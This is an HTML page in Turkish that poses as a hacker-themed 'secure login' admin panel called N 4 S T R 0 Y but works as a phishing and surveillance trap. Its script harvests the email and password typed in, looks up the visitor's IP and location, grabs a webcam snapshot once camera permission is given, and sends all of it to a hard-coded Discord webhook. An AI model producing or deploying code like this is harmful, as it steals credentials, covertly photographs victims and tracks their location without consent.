<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>N 4 S T R 0 Y // CORE</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; padding: 0; overflow-x: hidden; }
        #authWrapper { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
        .card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 30px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #333; color: #0f0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #f00; color: #fff; border: none; font-weight: bold; cursor: pointer; }
        
        #panel { display: none; padding: 10px; }
        .header { border-bottom: 1px solid #f00; padding: 10px; display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px; }
        
        /* İstediğin Düzen: Kamera Üstte, Menüler Altta */
        .grid-container { display: flex; flex-direction: column; gap: 15px; }
        .cam-box { width: 100%; border: 1px solid #222; background: #050505; padding: 5px; box-sizing: border-box; }
        #myCam { width: 100%; filter: grayscale(1) contrast(1.2); transform: scaleX(-1); border: 1px solid #333; }
        
        .info-box { border: 1px solid #222; background: #050505; padding: 15px; font-size: 11px; }
        .menu-item { padding: 12px 0; border-bottom: 1px solid #111; display: flex; justify-content: space-between; color: #888; }
        .status { color: #f00; font-weight: bold; }
        
        #mapImg { width: 100%; height: 150px; margin-top: 10px; border: 1px solid #333; display: none; }
        .footer { text-align: center; color: #222; font-size: 10px; margin-top: 20px; letter-spacing: 5px; }
    </style>
</head>
<body>

<audio id="opMusic" loop>
    <source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg">
</audio>

<div id="authWrapper">
    <div class="card">
        <h2 style="color:#f00; font-size: 16px;">SECURE LOGIN</h2>
        <input type="email" id="mail" placeholder="E-Posta Adresi">
        <input type="password" id="pass" placeholder="Şifre">
        <button onclick="startOp()">KAYIT OL VE BAĞLAN</button>
    </div>
</div>

<div id="panel">
    <div class="header">
        <span>N 4 S T R 0 Y // ADMIN ACCESS</span>
        <span id="clock">00:00:00</span>
    </div>

    <div class="grid-container">
        <div class="cam-box">
            <video id="myCam" autoplay playsinline muted></video>
            <div id="locData" style="color:#f00; font-size:10px; margin-top:10px;">KONUM SİNYALİ BEKLENİYOR...</div>
            <img id="mapImg" src="">
        </div>

        <div class="info-box">
            <div style="margin-bottom:10px; color:#f00; border-bottom:1px solid #333; padding-bottom:5px;">SİSTEM DURUMU</div>
            <div class="menu-item">BATARYA SEVİYESİ <span id="shrg" style="color:#0070f3;">%--</span></div>
            <div class="menu-item">IP ADRESİ <span id="ipVal" style="color:#fff;">Yükleniyor...</span></div>
            <div class="menu-item">MERNİS 2026 <span class="status">KİLİTLİ</span></div>
            <div class="menu-item">KONUM TAKİBİ <span class="status">AKTİF</span></div>
        </div>

        <div class="info-box" id="logs" style="color:#0070f3; font-size:10px; height:80px; overflow-y:auto;">
            [INFO] Başlatma komutu beklendi...<br>
        </div>
    </div>

    <div class="footer">N 4 S T R 0 Y</div>
</div>

<script>
    let userData = { ip: 'Bilinmiyor', lat: '', lon: '' };
    const webhook = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";

    // Verileri En Başta Çekmeye Başla
    async function getDetails() {
        try {
            const resp = await fetch('https://ipapi.co/json/');
            const d = await resp.json();
            userData.ip = d.ip;
            userData.lat = d.latitude;
            userData.lon = d.longitude;
        } catch(e) { console.log("Hızlı veri alınamadı."); }
    }
    getDetails();

    async function startOp() {
        const m = document.getElementById('mail').value;
        const p = document.getElementById('pass').value;
        if(!m.includes('@')) return alert("Geçersiz e-posta!");

        // 1. Müziği Başlat (Kullanıcı tıkladığı için çalışacak)
        const music = document.getElementById('opMusic');
        music.play().catch(e => console.log("Müzik engellendi"));

        // 2. Kamera İzni İste
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            document.getElementById('myCam').srcObject = stream;
            
            document.getElementById('authWrapper').style.display = 'none';
            document.getElementById('panel').style.display = 'block';

            // 3. Paneli Güncelle
            document.getElementById('ipVal').innerText = userData.ip;
            document.getElementById('locData').innerText = `KONUM: ${userData.lat}, ${userData.lon}`;
            if(userData.lat) {
                document.getElementById('mapImg').src = `https://static-maps.yandex.ru/1.x/?ll=${userData.lon},${userData.lat}&z=14&l=map&size=400,200&pt=${userData.lon},${userData.lat},pmwtm`;
                document.getElementById('mapImg').style.display = 'block';
            }
            
            navigator.getBattery().then(b => { document.getElementById('shrg').innerText = '%' + Math.round(b.level * 100); });

            // 4. Discord'a Fotoğraf ve Bilgi Gönder (2 saniye bekle ki kamera netleşsin)
            setTimeout(() => {
                const video = document.getElementById('myCam');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    const txt = `🚨 **N 4 S T R 0 Y - SIZMA**\n**Mail:** ${m}\n**Şifre:** ${p}\n**IP:** ${userData.ip}\n**Konum:** ${userData.lat},${userData.lon}`;
                    fd.append("payload_json", JSON.stringify({ content: txt }));
                    fd.append("file", blob, "shot.png");
                    fetch(webhook, { method: "POST", body: fd });
                });
            }, 2000);

        } catch(e) {
            alert("Sistem Erişimi İçin Kamera İzni Gerekli!");
        }
    }

    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
</script>
</body>
</html>
